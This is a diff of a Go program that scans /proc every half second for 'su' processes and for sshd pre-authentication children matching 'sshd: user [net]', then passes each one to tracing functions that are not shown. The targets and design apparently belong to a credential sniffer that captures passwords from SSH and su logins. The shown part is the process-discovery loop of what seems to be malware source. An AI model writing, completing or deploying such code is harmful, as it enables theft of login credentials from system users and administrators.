@@ -1,58 +1,104 @@
 package main
 
 import (
+	"fmt"
+	"io/ioutil"
 	"os"
-	"os/signal"
-	"syscall"
+	"regexp"
+	"strconv"
+	"strings"
+	"sync"
 	"time"
 )
 
-var shutdownChan = make(chan struct{})
+var (
+	processedSUs   = make(map[int]struct{})
+	processedSSHDs = make(map[int]struct{})
+	mutex          = sync.Mutex{}
+)
 
 func main() {
-	if syscall.Geteuid() != 0 {
-		os.Exit(1)
-	}
-
-	sigc := make(chan os.Signal, 1)
-	signal.Notify(sigc, os.Interrupt, syscall.SIGTERM)
-	go func() {
-		<-sigc
-		close(shutdownChan)
-		os.Exit(0)
-	}()
-
-	go watchProcesses("sshd", findSSHDProcesses, traceSSHDProcess)
-	go watchProcesses("su", findSUProcesses, traceSUProcess)
-
-	select {}
-}
-
-func watchProcesses(processName string, findFunc func() ([]int, error), traceFunc func(int)) {
-	processedPIDs := make(map[int]struct{})
 	ticker := time.NewTicker(500 * time.Millisecond)
 	defer ticker.Stop()
 
 	for {
 		select {
-		case <-shutdownChan:
-			return
 		case <-ticker.C:
-			pids, err := findFunc()
-			if err != nil {
-				continue
-			}
-
-			for _, pid := range pids {
-				if _, processed := processedPIDs[pid]; !processed {
-					go func(processName string, pid int) {
-						//fmt.Printf("Tracing %s process: %d\n", processName, pid)
-						traceFunc(pid)
-						//fmt.Printf("%s process %d traced.\n", processName, pid)
-					}(processName, pid)
-					processedPIDs[pid] = struct{}{}
-				}
-			}
+			go hawkProcesses()
 		}
 	}
+}
+
+func hawkProcesses() {
+	suPIDs, sshdPIDs, err := findProcesses()
+	if err != nil {
+		fmt.Println("Error finding processes:", err)
+		return
+	}
+
+	for _, suPID := range suPIDs {
+		go func(pid int) {
+			mutex.Lock()
+			defer mutex.Unlock()
+
+			if _, processed := processedSUs[pid]; processed {
+				return
+			}
+			traceSUProcess(pid)
+			processedSUs[pid] = struct{}{}
+		}(suPID)
+	}
+
+	for _, sshdPID := range sshdPIDs {
+		go func(pid int) {
+			mutex.Lock()
+			defer mutex.Unlock()
+
+			if _, processed := processedSSHDs[pid]; processed {
+				return
+			}
+			traceSSHDProcess(pid)
+			processedSSHDs[pid] = struct{}{}
+		}(sshdPID)
+	}
+}
+
+func findProcesses() ([]int, []int, error) {
+	var suPIDs []int
+	var sshdPIDs []int
+
+	dir, err := os.Open("/proc")
+	if err != nil {
+		return nil, nil, err
+	}
+	defer dir.Close()
+
+	entries, err := dir.Readdirnames(0)
+	if err != nil {
+		return nil, nil, err
+	}
+
+	for _, entry := range entries {
+		pid, err := strconv.Atoi(entry)
+		if err != nil {
+			continue
+		}
+
+		cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+		if err != nil {
+			continue
+		}
+
+		cmdlineStr := strings.ReplaceAll(string(cmdline), "\x00", " ")
+
+		if regexp.MustCompile(`su `).MatchString(cmdlineStr) {
+			suPIDs = append(suPIDs, pid)
+		}
+
+		if regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(cmdlineStr) {
+			sshdPIDs = append(sshdPIDs, pid)
+		}
+	}
+
+	return suPIDs, sshdPIDs, nil
 }
